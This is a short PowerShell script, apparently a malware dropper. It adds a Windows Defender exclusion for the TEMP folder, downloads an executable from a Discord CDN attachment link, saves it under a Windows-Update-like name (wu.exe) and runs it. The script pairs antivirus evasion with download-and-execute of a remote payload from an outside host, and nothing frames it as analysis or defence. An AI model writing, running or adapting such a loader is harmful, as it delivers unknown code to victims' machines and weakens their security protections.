$f="$env:TEMP\wu.exe"
Write-Host "[1] Adding exclusion..."
Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Write-Host
Write-Host "[2] Downloading..."
try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520422224589361222/scanner.exe?ex=6a41230a&is=6a3fd18a&hm=cea563e09e3e9c64f5c3cc193327444cf4042707df8f1fa97a73aab6204598d0&" -OutFile $f -UseBasicParsing } catch { Write-Host "Download error: $_" }
Write-Host "[3] File exists: $(Test-Path $f) Size: $((Get-Item $f -EA SilentlyContinue).Length)"
Write-Host "[4] Running..."
if (Test-Path $f) { & $f } else { Write-Host "File not found " }
Write-Host "[5] Done"
